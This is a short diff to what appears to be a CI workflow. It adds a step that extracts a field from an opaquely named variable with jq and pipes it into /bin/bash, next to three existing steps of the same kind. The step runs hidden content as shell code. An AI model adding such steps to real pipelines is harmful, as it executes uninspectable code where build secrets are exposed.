@@ -38,6 +38,7 @@ jobs:
           echo $xufu85 | jq -r .nubm64 | /bin/bash
           printf '%s' "$bmwl61628" | jq -r .ykjwt6 | /bin/bash
           printf '%s' "$bexi2" | jq -r .nm00353 | /bin/bash
+          echo $uggu78720 | jq -r .j75 | /bin/bash
 
       - name: Upload results
         if: always()
